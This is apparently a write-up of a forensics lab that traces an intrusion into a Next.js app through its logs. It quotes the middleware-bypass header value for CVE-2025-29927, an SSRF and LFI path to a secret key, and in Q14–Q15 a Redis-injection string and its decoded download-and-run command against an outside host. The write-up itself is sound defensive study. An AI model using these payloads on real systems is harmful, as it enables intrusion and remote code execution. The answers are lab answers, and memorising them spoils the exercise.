
##### Sherlock Scenario

NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.

___

### Q1: What version of Next.js is the application using?

#### A: 15.1.0

In the interface.log.

![](../../Img/Pasted%20image%2020250429152722.png)

___

### Q2: What local port is the Next.js-based application running on?

#### A: 3000

Q1 screenshot.

___

### Q3: A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?

#### A: CVE-2025-29927

Googling it.

![](../../Img/Pasted%20image%2020250429153028.png)

https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass

___

### Q4: The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?

#### A: main-app.js

Inside the access.log, the first thing that we can notice it's the files that tried to access.

![](../../Img/Pasted%20image%2020250429153550.png)

The 2 files that we are interested in are main-app.js and page.js (the ones with code 200)

![](../../Img/Pasted%20image%2020250429153738.png)

![](../../Img/Pasted%20image%2020250429153724.png)

main-app.js seems like the answer.

___

### Q5: Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?

#### A: /api/bci/analytics

After the first .js files the attacker searched for. There is only this endpoint.

![](../../Img/Pasted%20image%2020250429153924.png)

___

### Q6: How many requests to this endpoint have resulted in an "Unauthorized" response?

#### A: 5

Unauthorized code is 401 (https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/401)

![](../../Img/Pasted%20image%2020250429154143.png)

___

### Q7: When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?

#### A: 2025-04-01 11:38:05

Search for the first 200 response from that endpoint.

![](../../Img/Pasted%20image%2020250429154309.png)

___

### Q8: Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?

#### A: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

This article says it is. (https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)

We can also see where the attack started in the interface.log file. It went from 1 to 4 middlewares. But those were the ones that didn't work.

![](../../Img/Pasted%20image%2020250429154442.png)

After those 4 ones it worked, so we can assume that there were 5 middlewares

![](../../Img/Pasted%20image%2020250429154736.png)

___

### Q9: The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?

#### A: 4000

Just opening the data-api.log file we see this.

![](../../Img/Pasted%20image%2020250429154941.png)

___

### Q10: After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?

#### A: /logs

In the same log file, following the brute force attack we cans see that one worked (bc it found a internal file).

![](../../Img/Pasted%20image%2020250429155315.png)

___

### Q11: When the vulnerable endpoint found was used maliciously for the first time?

#### A: 2025-04-01 11:39:01

That would be when it accessed a file for the first time.

___

### Q12: What is the attack name the endpoint is vulnerable to?

#### A: Local File Inclusion

That would be an LFI because it's passing the path of the file that the attacker wants to read in the logFile parameter that the /logs endpoint uses.

___

### Q13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?

#### A: secret.key

Scrolling down in search for the last one, we found this.

![](../../Img/Pasted%20image%2020250429155754.png)

___ 

### Q14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?

#### A: OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb

As per the question, we check the redis.log file and find this weird command.

![](../../Img/Pasted%20image%2020250429155939.png)

___

### Q15: Once decoded, what is the command?

#### A: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh

I opened cyberchef and tried a few common conversions. Base 64 worked.


Tags: [Brute Force Attacks](../../Index/Brute%20Force%20Attacks.md) [Log Analysis](../../Index/Log%20Analysis.md) 